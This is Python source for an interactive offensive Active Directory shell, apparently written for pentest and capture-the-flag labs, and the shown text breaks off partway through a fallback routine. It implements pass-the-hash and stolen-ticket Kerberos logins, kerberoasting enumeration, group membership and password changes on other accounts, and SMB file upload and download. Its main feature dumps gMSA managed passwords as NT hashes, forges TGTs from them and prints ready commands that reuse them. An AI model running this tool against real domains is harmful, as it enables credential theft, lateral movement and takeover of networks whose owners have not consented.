import time
import ssl
from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
from rich import print # for colors
import readline
import rlcompleter
import os
import atexit
import heapq
import shlex
histfile = os.path.expanduser(".ldap_shell_history")

if os.path.exists(histfile):
    readline.read_history_file(histfile)

atexit.register(readline.write_history_file, histfile)
from src.structs import Session, Queue, DecisionNode, TreeNode, HistoryNode, SinglyLinkedList, SessionManager, BSTNode, UserCacheBST
from src.utils import UAC_FLAGS, COMMANDS, shell_completer, show_menu, infer_netbios, domain_to_dn, check_connection, sid_to_string, save_password, resolve_sid, resolve_member_name
from src.queries import batch_lookup, build_category_tree, print_categories, list_groups_bfs, list_users, list_computers, kerberoastable, get_sid, get_maq, list_trusts
from src.add import add_member, add_computer, modify_uac, set_password
from src.acls import cmd_setowner, cmd_genericall
from src.auth import samr_set_password
from src.kerberos_seal import sealed_kerberos_connect
from src.discover import get_domain_info
sessions = Session()
current_session = None
history = Session()
MAX_SESSIONS = 10
decision_tree = DecisionNode("Am I connected?")
decision_tree.left = DecisionNode("Not Connected. Run 'connect'")
decision_tree.right = DecisionNode("Connected. Continue")
user_cache = UserCacheBST()


def get_dc_hostname(dc_ip):
    """Resolve the DC's dnsHostName via anonymous bind; None if unavailable."""
    try:
        tmp_server = Server(dc_ip, get_info=ALL)
        tmp_conn = Connection(tmp_server, auto_bind=True)
        dns_val = tmp_server.info.other.get('dnsHostName')
        tmp_conn.unbind()
        if dns_val:
            return str(dns_val[0]) if isinstance(dns_val, (list, tuple)) else str(dns_val)
    except Exception:
        pass
    return None


def write_krb5_conf(domain, realm, dc_ip, extra_domains=None):
    """Write a minimal krb5.conf pointing the realm(s) at the DC and export KRB5_CONFIG.

    dns_canonicalize_hostname/rdns are disabled so the SPN krb5 builds stays exactly
    the hostname we connect to - reverse-DNS canonicalization can rewrite it and make
    the cached ticket stop matching ("Matching credential not found").
    extra_domains adds [realms]/[domain_realm] entries for other domains served by the
    same DC (cross-realm setups, e.g. ping.htb <-> pong.htb).
    """
    domains = [domain.lower()]
    for d in (extra_domains or []):
        if d and d.lower() not in domains:
            domains.append(d.lower())
    realm_sections = "\n".join(
        f"""    {d.upper()} = {{
        kdc = {dc_ip}
        admin_server = {dc_ip}
    }}""" for d in domains)
    domain_sections = "\n".join(
        f"    .{d} = {d.upper()}\n    {d} = {d.upper()}" for d in domains)
    krb5_conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    dns_canonicalize_hostname = false
    rdns = false

[realms]
{realm_sections}

[domain_realm]
{domain_sections}
"""
    with open("/tmp/ldapshell_krb5.conf", "w") as f:
        f.write(krb5_conf)
    os.environ["KRB5_CONFIG"] = "/tmp/ldapshell_krb5.conf"


def domain_from_host(hostname, exclude_domain=None):
    """Domain part of a FQDN hostname, None if same as exclude_domain or not a FQDN."""
    if hostname and '.' in hostname:
        d = hostname.split('.', 1)[1].lower()
        if d and d != (exclude_domain or '').lower():
            return d
    return None


def kerberos_connect(username, domain, dc_ip, password=None, nthash=None):
    """Request a TGT (password or NT-hash/RC4 preauth) and open an LDAP SASL/Kerberos session.

    Hash-based preauth lets us authenticate on domains where NTLM is disabled,
    e.g. machine/gMSA accounts: connectk_hash gMSA01$ <nthash> <domain> <dc_ip>
    Returns the session profile dict, raises on failure.
    """
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants
    from impacket.krb5.ccache import CCache

    realm = domain.upper()
    print(f"[*] Getting TGT for {username}@{realm} via impacket{' (RC4 hash auth)' if nthash else ''}...")

    # Build principal (works with machine accounts like MS01$)
    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    if nthash:
        # RC4-only etype: the KDC uses the NT hash directly for preauth
        tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, '', realm, '', nthash, '', dc_ip)
    else:
        tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, '', '', '', dc_ip)

    # Save to ccache file (same as getTGT.py)
    ccache = CCache()
    ccache.fromTGT(tgt, old_session_key, session_key)
    ccache_file = f"{username}.ccache"
    ccache.saveFile(ccache_file)
    os.environ["KRB5CCNAME"] = ccache_file
    print(f"[+] TGT saved to {ccache_file}")

    # Kerberos needs DC hostname, not IP (for SPN matching)
    dc_hostname = get_dc_hostname(dc_ip)

    if not dc_hostname:
        dc_hostname = dc_ip
        print(f"[!] Could not resolve DC hostname, using IP (may fail)")

    write_krb5_conf(domain, realm, dc_ip, extra_domains=[domain_from_host(dc_hostname, domain)])

    print(f"[*] Connecting to {dc_hostname} via Kerberos...")
    server = Server(dc_hostname, get_info=ALL)
    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
    profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":domain_to_dn(domain), "connected_at": time.time(), "domain": domain, "ldaps":False, "kerberos": True, "ccache": ccache_file, "nthash": nthash}
    return profile


def ticket_connect(ccache_file, dc_ip, domain=None):
    """Open an LDAP SASL/Kerberos session using an existing .ccache (or .kirbi) ticket file.

    No password/hash needed - the ticket is reused as-is, like `nxc ldap <ip> --use-kcache`.
    The username and realm are read from the ticket itself:
    use_ticket ldap_dc2.ccache 192.168.2.2 [domain]
    Returns the session profile dict, raises on failure.
    """
    from impacket.krb5.ccache import CCache

    def _comp_str(val):
        data = val['data']
        return data.decode(errors='replace') if isinstance(data, bytes) else str(data)

    if ccache_file.lower().endswith('.kirbi'):
        ccache = CCache.loadKirbiFile(ccache_file)
    else:
        try:
            ccache = CCache.loadFile(ccache_file)
        except Exception:
            ccache = CCache.loadKirbiFile(ccache_file)

    username = '/'.join(_comp_str(c) for c in ccache.principal.components)
    realm = _comp_str(ccache.principal.realm)
    if not username:
        raise Exception(f"Could not read principal from {ccache_file}")

    # Domain given -> trust it; otherwise infer it from the ticket's realm
    if domain:
        realm = domain.upper()
    else:
        domain = realm.lower()

    ccache_file = os.path.abspath(ccache_file)
    os.environ["KRB5CCNAME"] = ccache_file
    print(f"[+] Using ticket {ccache_file} ({username}@{realm})")

    # Kerberos needs DC hostname, not IP (for SPN matching).
    # Collect every service ticket in the cache (e.g. ldap/dc2.pong.htb) and
    # prefer one for the requested domain - cross-realm ccaches may hold STs
    # for several DCs (ping.htb <-> pong.htb forest trust).
    dc_hostname = None
    try:
        st_hosts = []
        for cred in ccache.credentials:
            comps = [_comp_str(c) for c in cred['server'].components]
            if len(comps) >= 2 and comps[0].lower() != 'krbtgt' and '.' in comps[1]:
                st_hosts.append(comps[1])
        if domain:
            for host in st_hosts:
                if host.lower().endswith('.' + domain.lower()):
                    dc_hostname = host
                    break
        if not dc_hostname and st_hosts:
            dc_hostname = st_hosts[0]
    except Exception:
        pass
    if not dc_hostname:
        dc_hostname = get_dc_hostname(dc_ip)
    if not dc_hostname:
        dc_hostname = dc_ip
        print(f"[!] Could not resolve DC hostname, using IP (may fail)")

    # Also map the DC's own domain so cross-realm setups (e.g. ping.htb <-> pong.htb)
    # resolve to the right realm and match the service principal stored in the ticket
    write_krb5_conf(domain, realm, dc_ip, extra_domains=[domain_from_host(dc_hostname, domain)])

    print(f"[*] Connecting to {dc_hostname} via Kerberos...")

    ldaps = False

    def _try_sasl(host, use_ssl=False, tls_version=None):
        if use_ssl:
            kwargs = {"validate": ssl.CERT_NONE}
            if tls_version:
                kwargs["version"] = tls_version
            srv = Server(host, port=636, use_ssl=True, get_info=ALL, tls=Tls(**kwargs))
            # Pin the SPN to the ticket's hostname even when connecting to the IP
            return Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS,
                              sasl_credentials=(dc_hostname, None), auto_bind=True,
                              auto_referrals=False)
        srv = Server(host, get_info=ALL)
        return Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS,
                          sasl_credentials=(dc_hostname, None), auto_bind=True,
                          auto_referrals=False)

    conn = None
    attempts = [
        ("LDAP  389 " + dc_hostname, lambda: _try_sasl(dc_hostname)),
        ("LDAP  389 " + dc_hostname + " (sealed)", lambda: sealed_kerberos_connect(dc_ip, dc_hostname, domain, username)),
        ("LDAPS 636 " + dc_hostname, lambda: _try_sasl(dc_hostname, use_ssl=True)),
        ("LDAPS 636 " + dc_ip + " (SPN: ldap/" + dc_hostname + ")", lambda: _try_sasl(dc_ip, use_ssl=True)),
        ("LDAPS 636 " + dc_hostname + " (TLS1.2)", lambda: _try_sasl(dc_hostname, use_ssl=True, tls_version=ssl.PROTOCOL_TLSv1_2)),
    ]
    errors = []
    for desc, attempt in attempts:
        try:
            print(f"[*] Trying {desc}...")
            conn = attempt()
            ldaps = 'LDAPS' in desc
            break
        except Exception as e:
            errors.append(f"{desc}: {e}")

    if conn is None:
        raise Exception("all connection attempts failed:\n    " + "\n    ".join(errors))

    # Use the DC's actual naming context as base DN: the ticket's client realm
    # can differ from the directory hosted on the DC (cross-domain setup,
    # e.g. user from ping.htb against a DC of pong.htb). RootDSE was fetched
    # through the connection, so the real namingContexts are available.
    base_dn = None
    try:
        val = conn.server.info.other.get('defaultNamingContext') or conn.server.info.other.get('namingContexts')
        if val:
            base_dn = str(val[0]) if isinstance(val, (list, tuple)) else str(val)
            print(f"[*] Base DN: {base_dn}")
    except Exception:
        pass
    if not base_dn:
        base_dn = domain_to_dn(domain)

    profile = {"ip": dc_ip, "username": username, "password": None, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":ldaps, "kerberos": True, "ccache": ccache_file, "nthash": None}
    return profile


def conn_failed_authz(session):
    """True when a failed write is worth a Kerberos-authz hint for."""
    return bool(session and session.get("kerberos"))


def print_pac_hint(session):
    print(f"[bold yellow][!] Hint: this session is Kerberos (dc={session.get('ip')}).[/bold yellow]")
    print("[bold yellow]    If checkacl shows the right but writes fail with insufficientAccessRights:[/bold yellow]")
    print("[bold yellow]    1. Verify other tools (bloodyAD/nxc) target the SAME DC IP as this session.[/bold yellow]")
    print("[bold yellow]    2. Run 'checkpac': some DCs issue PAC-less tickets (no group SIDs in the[/bold yellow]")
    print("[bold yellow]       ticket), so rights granted via GROUP membership cannot be used and any[/bold yellow]")
    print("[bold yellow]       write fails with insufficientAccessRights even if the ACL allows it.[/bold yellow]")


def connect(initial_command=None):
    #session = Session()
    global current_session

    first_run = True

    while True:
        if current_session:
            prompt = f"ldap({current_session['username']}@{current_session['ip']})> "
        else:
            prompt = "shell> "

        if first_run and initial_command:
            command = initial_command
            first_run = False
        else:
            try:
                user_input = input(prompt).strip()
                try:
                    command = shlex.split(user_input)
                except ValueError:
                    command = user_input.split()
            except (KeyboardInterrupt, EOFError):
                print()
                break
        if not command:
            continue
        elif command[0] == "help":
            show_menu()
        elif command[0] == "connect":
            if len(command) < 5:
                print("connect <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connectk":
            if len(command) < 5:
                print("connectk <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]

            try:
                profile = kerberos_connect(username, domain, dc_ip, password=password)
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} via Kerberos. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connectk_hash":
            if len(command) < 5:
                print("connectk_hash <username> <nthash> <domain> <dc_ip> - Kerberos with NT hash (use when NTLM is disabled)")
                continue
            username = command[1]
            nthash = command[2]
            domain = command[3]
            dc_ip = command[4]
            if ':' in nthash:
                nthash = nthash.split(':')[1]
            try:
                profile = kerberos_connect(username, domain, dc_ip, nthash=nthash)
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} via Kerberos (hash auth). Session ID: {sessions.size()-1}[/bold green]")
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "use_ticket":
            if len(command) < 3:
                print("use_ticket <ccache_file> <dc_ip> [domain] - Connect via Kerberos using an existing ticket file (.ccache/.kirbi); domain is read from the ticket if omitted")
                continue
            ccache_file = command[1]
            dc_ip = command[2]
            domain = command[3] if len(command) > 3 else None
            if not os.path.exists(ccache_file):
                print(f"[-] Ticket file not found: {ccache_file}")
                continue
            try:
                profile = ticket_connect(ccache_file, dc_ip, domain)
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {profile['domain']} via Kerberos using {os.path.basename(ccache_file)}. Session ID: {sessions.size()-1}[/bold green]")
            except Exception as e:
                print(f"[-] Connection Failed: {e}")
        elif command[0] == "connect_hash":
            if len(command) < 5:
                print("connect_hash <username> <nthash> <domain> <dc_ip>  (NTLM; use connectk_hash if the domain disables NTLM)")
                continue
            username = command[1]
            nthash = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)

            if ":" not in nthash:
                password = f"aad3b435b51404eeaad3b435b51404ee:{nthash}"
            else:
                password = nthash

            try:
                server = Server(dc_ip, get_info=ALL)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "nthash": nthash, "ldaps": False}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain} using PTH. Session ID: {sessions.size()-1}[/bold green]")
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "connectssl":
            if len(command) < 5:
                print("connectssl <username> <password> <domain> <dc_ip>")
                continue
            username = command[1]
            password = command[2]
            domain = command[3]
            dc_ip = command[4]
            netbios = infer_netbios(domain)
            base_dn = domain_to_dn(domain)
            try:
                tls = Tls(validate=ssl.CERT_NONE)
                server = Server(dc_ip, port=636, use_ssl=True, get_info=ALL, tls=tls)
                conn = Connection(server, user=f"{netbios}\\{username}", password=password, authentication=NTLM, auto_bind=True)
                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps": True}
                if sessions.size() >= MAX_SESSIONS:
                    removed = sessions.items.pop(0)
                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
                    if current_session == removed:
                        current_session = None
                sessions.push(profile)
                if not current_session:
                    current_session = profile
                print(f"[bold green][+] Connected to {domain}. Session ID: {sessions.size()-1}[/bold green]")
                save_password(password)
            except Exception as e:
                print(f"[-] Connection Failed: {e}")

        elif command[0] == "disconnect":
            try:
                dropped = sessions.pop()
                if current_session == dropped:
                    current_session = None
                print(f"Dropped: {dropped.get('username')}@{dropped.get('ip')}")
            except IndexError as e:
                print(e)
        elif command[0] == "status":
            print(sessions)
        elif command[0] == "query":
            check_connection(decision_tree, current_session is not None)

            if current_session is None:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            if len(command) < 2:
                print("query <username>")
                continue

            username = command[1]
            try:
                conn = current_session["conn"]
                base_dn = current_session["base_dn"]
                conn.search(base_dn, f"(sAMAccountName={username})", attributes=["cn", "memberOf", "userAccountControl", "userPrincipalName", "objectSid"])
                if conn.entries:
                    entry = conn.entries[0]
                    print(entry)
                    if "userAccountControl" in entry and entry.userAccountControl.value is not None:
                        uac_val = entry.userAccountControl.value
                        flags = [name for name, val in UAC_FLAGS.items() if uac_val & val]
                        print(f"\n[bold cyan]UserAccountControl Flags:[/bold cyan] {', '.join(flags)} ({uac_val})")
                    history.push(username)
                else:
                    print("User not found...")
            except Exception as e:
                print(f"Ldap error: {e}")
        elif command[0] == "history":
            try:
                last = history.pop()
                print(f"Last queried user: {last}")
            except IndexError as e:
                print(e)
        elif command[0] == "show_all_history":
            history.show_all()

        elif command[0] == "batch_lookup":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            batch_lookup(current_session["conn"], current_session["base_dn"])
        elif command[0] == "use":
            if len(command) < 2:
                print("use <session_id>")
                continue
            try:
                sessionid = int(command[1])
                current_session = sessions.items[sessionid]
                # Kerberos sessions must point KRB5CCNAME back at their own ccache
                if current_session.get("kerberos") and current_session.get("ccache"):
                    os.environ["KRB5CCNAME"] = current_session["ccache"]
                print(f"Using session {sessionid} ({current_session['username']} @ {current_session['ip']})")
            except:
                print("Invalid ID")
        elif command[0] == "sessions":
            if sessions.is_empty():
                print("No active sessions :(")
                continue
            for i, s in enumerate(sessions.items):
                elapsed = int(time.time() - s['connected_at'])
                print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "categories":
            if not current_session:
                print("No active session!")
                continue
            root = build_category_tree(current_session["conn"], current_session["base_dn"])
            print_categories(root)
        elif command[0] == "groups":
            if not current_session:
                print("No Active Session!")
                continue
            list_groups_bfs(current_session["conn"], current_session["base_dn"])
        elif command[0] == "users":
            if not current_session:
                print("No Active Session!")
                continue
            list_users(current_session["conn"], current_session["base_dn"], user_cache)
        elif command[0] == "offline_search":
            if len(command) < 2:
                print("offline_search  <username>")
                continue
            target = command[1]
            result = user_cache.search(target)
            if result:
                print(f"[bold green][+] Cache Hit ![/bold green]\n{result}")
            else:
                print(f"[bold red][!] User not found in offline cache. Run 'users' first to populate it.[/bold red]")
        elif command[0] == "kerberoasting":
            if not current_session:
                print("No Active Session!")
                continue
            kerberoastable(current_session["conn"], current_session["base_dn"])
        elif command[0] == "computers":
            if not current_session:
                print("No Active Session!")
                continue
            list_computers(current_session["conn"], current_session["base_dn"])
            #else:
                #print("\nActive Sessions\n")

                #for i, s in enumerate(sessions.items):
                    #elapsed = int(time.time() - s['connected_at'])
                    #print(f"[{i}] User: {s['username']}, Domain: {s['ip']}")
                    #print(f"[{i}] {s['username']} @ {s['ip']} ({elapsed}s)")
        elif command[0] == "checkacl":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue

            target_username = current_session.get("username")
            import argparse
            args = argparse.Namespace()
            args.username = target_username
            args.password = current_session.get("password")
            args.domain = current_session.get("domain")
            args.dc_ip = current_session.get("ip")
            args.dc_fqdn = None
            args.hash = current_session.get("nthash")
            args.ldaps = current_session.get("ldaps", False)
            args.kerberos = current_session.get("kerberos", False)
            # Reuse the session's live connection (required for sealed Kerberos
            # sessions; also avoids reconnecting) and its real naming context
            args.conn = current_session.get("conn")
            args.base_dn = current_session.get("base_dn")

            try:
                from aclftw import aclftw
                aclftw.main(args)
            except Exception as e:
                print(f"[-] Error running aclftw: {e}")

        elif command[0] == "setpass":

            if len(command) < 3:
                print("setpass <user> <newpassword>")
                continue

            target_user = command[1]
            newpass = command[2]

            # Use SAMR protocol over SMB (port 445) - no SSL needed
            try:
                samr_set_password(current_session, target_user, newpass)
                print(f"[+] Password changed successfully for {target_user}")
            except Exception as e:
                print(f"[-] Failed to change password: {e}")

        elif command[0] == "savepassword":

            if len(command) < 2:
                print("savepassword <password>")
                continue
            save_password(command[1])

        elif command[0] == "shares":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("Usage:")
                print("  shares <ip>                          - List all shares")
                print("  shares <ip> <share>                  - List files in share")
                print("  shares <ip> <share>\\<subdir>         - Browse subdirectory")
                print("  shares <ip> <share> get <file>       - Download file")
                print("  shares <ip> <share> put <localfile>  - Upload file")
                print("  (Use quotes for share names with spaces: \"Department Shares\")")
                continue
            target_ip = command[1]

            username = current_session.get("username")
            password = current_session.get("password")
            domain = current_session.get("domain")
            nthash = current_session.get("nthash")

            from shares import shares as shares_module

            if len(command) == 2:
                shares_module.main(target_ip, username, password, domain, nthash)
            else:
                action_idx = None
                for i in range(2, len(command)):
                    if command[i].lower() in ("get", "put"):
                        action_idx = i
                        break

                if action_idx is not None:
                    share_parts = command[2:action_idx]
                    action = command[action_idx].lower()
                    filename = command[action_idx + 1] if action_idx + 1 < len(command) else None

                    if not share_parts:
                        print("[-] Missing share name.")
                        continue
                    if not filename:
                        print(f"[-] Missing filename for '{action}'.")
                        continue

                    share_full = " ".join(share_parts)
                    if "\\" in share_full:
                        share = share_full.split("\\")[0]
                        subpath = "\\".join(share_full.split("\\")[1:])
                        filename = subpath + "\\" + filename
                    else:
                        share = share_full

                    if action == "get":
                        shares_module.download_file(target_ip, username, password, domain, share, filename, nthash)
                    elif action == "put":
                        shares_module.upload_file(target_ip, username, password, domain, share, filename, nthash)
                else:
                    share_full = " ".join(command[2:])

                    if "\\" in share_full:
                        parts = share_full.split("\\", 1)
                        share = parts[0].strip()
                        subpath = parts[1].strip().rstrip("\\") + "\\*"
                        shares_module.list_files(target_ip, username, password, domain, share, subpath, nthash)
                    else:
                        share = share_full
                        shares_module.list_files(target_ip, username, password, domain, share, "*", nthash)


            # try:
            #     from shares import shares as shares_module
            #     shares_module.main(
            #         target_ip,
            #         current_session.get("username"),
            #         current_session.get("password"),
            #         current_session.get("domain"),
            #         nthash=current_session.get("nthash")
            #     )
            # except Exception as e:
            #     print(f"[-] Error enumerating shares: {e}")

        elif command[0] == "get_sid":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("get_sid <username>")
                continue
            try:
                get_sid(current_session["conn"], current_session["base_dn"], command[1])
            except Exception as e:
                print(f"[-] Error getting SID: {e}")
        elif command[0] == "addmember":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 3:
                print("addmember <group_name> <username>")
                continue
            try:
                add_member(current_session["conn"], current_session["base_dn"], command[1], command[2])
            except Exception as e:
                print(f"[-] Error while add users: {e}")
        elif command[0] == "getgmsa":
            if not current_session:
                print("No active session! Please 'use' a session or 'connect' first.")
                continue
            if len(command) < 2:
                print("getgmsa <gmsa_account$>")
                continue
            target_gmsa = command[1]
            if not target_gmsa.endswith('$'):
                target_gmsa += '$'

            try:
                import struct
                import hashlib
                import subprocess
                import re

                def parse_managed_password(blob):
                    """Parse MS-GGEDP msDS-ManagedPassword blob -> current password NT hash"""
                    version, reserved, length, cur_off, prev_off, query_off, unch_off = struct.unpack('<HHLHHHH', blob[:16])
                    offsets = [o for o in [prev_off, query_off, unch_off] if o > cur_off]
                    end_off = min(offsets) if offsets else len(blob)
                    pwd_bytes = blob[cur_off:end_off]
                    if len(pwd_bytes) >= 2:
                        pwd_bytes = pwd_bytes[:-2]  # strip null terminator
                    return hashlib.new('md4', pwd_bytes).hexdigest()

                def read_managed_password(conn_obj, base_dn_obj):
                    try:
                        conn_obj.search(base_dn_obj, f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
                        if conn_obj.entries and 'msDS-ManagedPassword' in conn_obj.entries[0] and conn_obj.entries[0]['msDS-ManagedPassword'].raw_values:
                            return parse_managed_password(conn_obj.entries[0]['msDS-ManagedPassword'].raw_values[0])
                    except Exception as e:
                        print(f"[*] LDAP read of msDS-ManagedPassword failed: {e}")
                    return None

                def report_success(nt_hash):
                    print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
                    print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
                    target_fqdn = f"{target_gmsa[:-1].lower()}.{current_session['domain']}"
                    print(f"[*] Use it: nxc smb {target_fqdn} -u '{target_gmsa}' -H '{nt_hash}' -k")
                    print(f"[*] Open a session here: connectk_hash {target_gmsa} {nt_hash} {current_session['domain']} {current_session['ip']}")
                    # Best effort: save a TGT ccache for the account (RC4 hash preauth),
                    # handy for -k tools outside this shell. Does not touch KRB5CCNAME.
                    try:
                        from impacket.krb5.kerberosv5 import getKerberosTGT
                        from impacket.krb5.types import Principal
                        from impacket.krb5 import constants
                        from impacket.krb5.ccache import CCache
                        principal = Principal(target_gmsa, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                        tgt, cipher, old_session_key, session_key = getKerberosTGT(principal, '', current_session['domain'].upper(), '', nt_hash, '', current_session['ip'])
                        cc = CCache()
                        cc.fromTGT(tgt, old_session_key, session_key)
                        cc_file = f"{target_gmsa}.ccache"
                        cc.saveFile(cc_file)
                        print(f"[*] Saved TGT for {target_gmsa} to {cc_file} (export KRB5CCNAME={cc_file} to use it)")
                    except Exception:
                        pass

                base_dn = current_session["base_dn"]
                kerberos = current_session.get("kerberos", False)

                def get_dc_fqdn(session):
                    try:
                        val = session["conn"].server.info.other.get('dnsHostName')
                        if val:
                            # ldap3 returns a list here, but a str after some binds
                            return str(val[0]) if isinstance(val, (list, tuple)) else str(val)
                    except Exception:
                        pass
                    return None

                nt_hash = None

                # 1) Existing session connection (works when it is LDAPS or otherwise sealed)
                nt_hash = read_managed_password(current_session["conn"], base_dn)

                # 2) Impacket LDAP with sign/seal. AD requires a signed/sealed channel for
                #    msDS-ManagedPassword and ldap3 on Linux cannot do NTLM/Kerberos
                #    session security, so this is the reliable native path.
                if not nt_hash:
                    print("[*] Plain LDAP blocked msDS-ManagedPassword. Retrying via impacket LDAP sign/seal...")
                    dc_fqdn = get_dc_fqdn(current_session)
                    try:
                        from impacket.ldap import ldap as imp_ldap
                        # Kerberos SPN needs the DC hostname in the URL (ldap/<host>),
                        # dstIp connects to the IP directly
                        url_host = dc_fqdn if (kerberos and dc_fqdn) else current_session["ip"]
                        lconn = imp_ldap.LDAPConnection(url=f'ldap://{url_host}', dstIp=current_session["ip"])
                        if kerberos:
                            lconn.kerberosLogin(current_session['username'], '', current_session['domain'], '', '', '', kdcHost=dc_fqdn or current_session["ip"], useCache=True)
                        elif current_session.get("nthash"):
                            lconn.login(current_session['username'], '', current_session['domain'], 'aad3b435b51404eeaad3b435b51404ee', current_session["nthash"])
                        else:
                            lconn.login(current_session['username'], current_session['password'], current_session['domain'], '', '')
                        resp = lconn.search(base_dn, searchFilter=f"(sAMAccountName={target_gmsa})", attributes=['msDS-ManagedPassword'])
                        if resp:
                            raw_attr = resp[0]['attributes'][0]
                            try:
                                vals = raw_attr['vals']
                            except Exception:
                                vals = [raw_attr['val']]
                            nt_hash = parse_managed_password(bytes(vals[0]))
                    except Exception as e:
                        print(f"[*] Impacket retrieval failed: {e}")

                # 3) Fresh LDAPS (636) connection: TLS satisfies the secure-channel
                #    requirement, so no NTLM sign/seal (which ldap3 cannot do) is needed.
                if not nt_hash:
                    print("[*] Impacket retrieval failed. Retrying over LDAPS (636)...")
                    netbios = infer_netbios(current_session["domain"])
                    try:
                        tls = Tls(validate=ssl.CERT_NONE)
                        srv = Server(current_session["ip"], port=636, use_ssl=True, get_info=ALL, tls=tls)
                        if kerberos:
                            ldaps_conn = Connection(srv, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
                        elif current_session.get("nthash"):
                            ldaps_conn = Connection(srv, user=f"{netbios}\\{current_session['username']}", password=f"aad3b435b51404eeaad3b435b51404ee:{current_session['nthash']}", authentication=NTLM, auto_bind=True)
                        else:
                            ldaps_conn = Connection(srv, user=f"{netbios}\\{current_session['username']}", password=current_session["password"], authentication=NTLM, auto_bind=True)
                        nt_hash = read_managed_password(ldaps_conn, base_dn)
                        ldaps_conn.unbind()
                    except Exception as e:
                        print(f"[*] LDAPS fallback failed: {e}")

                if nt_hash:
                    report_success(nt_hash)
                    continue

                # 4) Last resort: NXC / NetExec (it handles LDAP signing/sealing itself)
                print(f"[*] Native LDAP3 retrieval failed or blocked. Attempting fallback via NXC NTLM sign/seal...")
                # Kerberos needs the DC hostname for SPN matching
                host = current_session["ip"]
                if kerberos:
                    host = get_dc_fqdn(current_session) or current_session["ip"]

                out = None
                for tool in ('nxc', 'netexec'):
                    try:
                        cmd = [tool, 'ldap', host, '-u', current_session['username'], '-d', current_session['domain']]
                        if current_session.get("nthash"):
                            cmd.extend(['-H', current_session["nthash"]])
                        else:
                            cmd.extend(['-p', current_session["password"]])
                        if kerberos:
                            cmd.append('-k')
                        cmd.append('--gmsa')
